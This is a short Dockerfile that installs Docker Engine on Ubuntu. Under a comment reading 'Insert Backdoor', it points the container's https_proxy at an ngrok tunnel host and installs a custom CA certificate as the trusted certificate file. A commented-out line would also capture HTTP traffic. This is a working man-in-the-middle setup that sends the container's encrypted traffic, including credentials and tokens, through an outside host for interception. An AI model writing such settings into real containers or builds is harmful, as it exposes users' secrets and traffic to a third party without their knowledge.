# Use an existing base image, e.g., Ubuntu
FROM ubuntu:20.04

# Install prerequisites
RUN apt-get update && apt-get install -y \
    apt-transport-https \
    ca-certificates \
    curl \
    gnupg-agent \
    software-properties-common

# Add Docker’s official GPG key
RUN curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -

# Add Docker repository
RUN add-apt-repository \
   "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"

# Install Docker Engine and CLI
RUN apt-get update && apt-get install -y docker-ce docker-ce-cli containerd.io

# Copy your daemon script & library into the container
COPY cacert.pem /cacert.pem
RUN chmod +r /cacert.pem
RUN chmod -w /cacert.pem

# Do not proxy AWS specific trafic (need to adjust based on cloud environement)
ENV no_proxy="169.254.169.254,*.amazonaws.com"
# Insert Backdoor
ENV https_proxy="http://2.tcp.us-cal-1.ngrok.io:11239"
#ENV http_proxy="http://4.tcp.eu.ngrok.io:11125" #Only enebale this if you want to capute HTTP traffic (do NOT enable this for AWS stuff as aws stuff tries to access metadata endpoint via http)
ENV SSL_CERT_FILE=/cacert.pem


# Set the default command to run when the container starts
CMD ["/bin/bash"]
